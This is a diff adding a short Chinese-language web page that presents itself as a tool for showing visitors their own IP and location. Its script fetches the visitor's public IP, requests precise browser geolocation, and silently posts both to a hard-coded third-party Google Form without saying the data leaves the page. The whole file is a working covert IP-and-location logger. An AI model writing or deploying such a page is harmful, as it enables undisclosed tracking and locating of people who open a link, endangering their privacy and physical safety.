@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8" />
+  <title>IP与地理位置采集</title>
+  <style>
+    body { font-family: Arial, sans-serif; padding: 20px; }
+    #status { margin-top: 20px; }
+  </style>
+</head>
+<body>
+  <h1>获取你的IP和地理位置</h1>
+  <p id="info">正在获取中，请允许定位权限...</p>
+
+  <script>
+    const googleFormURL = "https://docs.google.com/forms/u/0/d/e/1FAIpQLSeWEBe4zv0G74aEItUIJIUhx-vcqLy4cVs_VO68Dqo0wN9H5w/formResponse";
+
+  
+    const entryIP = "entry.349181765";
+    const entryLon = "entry.1434358418";
+    const entryLat = "entry.99996352";
+
+    async function getIP() {
+      try {
+        let res = await fetch('https://api.ipify.org?format=json');
+        let data = await res.json();
+        return data.ip;
+      } catch (e) {
+        return "获取失败";
+      }
+    }
+
+    function postToGoogleForm(ip, lon, lat) {
+      const formData = new FormData();
+      formData.append(entryIP, ip);
+      formData.append(entryLon, lon);
+      formData.append(entryLat, lat);
+
+      fetch(googleFormURL, {
+        method: 'POST',
+        mode: 'no-cors',
+        body: formData
+      }).catch(console.error);
+    }
+
+    async function main() {
+      const ip = await getIP();
+      document.getElementById('info').textContent = "IP: " + ip + "，等待定位中...";
+
+      if (!navigator.geolocation) {
+        document.getElementById('info').textContent = "浏览器不支持定位功能";
+        postToGoogleForm(ip, "不支持", "不支持");
+        return;
+      }
+
+      navigator.geolocation.getCurrentPosition(position => {
+        const lat = position.coords.latitude.toFixed(6);
+        const lon = position.coords.longitude.toFixed(6);
+        document.getElementById('info').textContent = `IP: ${ip}\n经度: ${lon}\n纬度: ${lat}`;
+        postToGoogleForm(ip, lon, lat);
+      }, err => {
+        document.getElementById('info').textContent = `IP: ${ip}\n定位失败：${err.message}`;
+        postToGoogleForm(ip, "失败", "失败");
+      }, {timeout: 15000});
+    }
+
+    main();
+  </script>
+</body>
+</html>
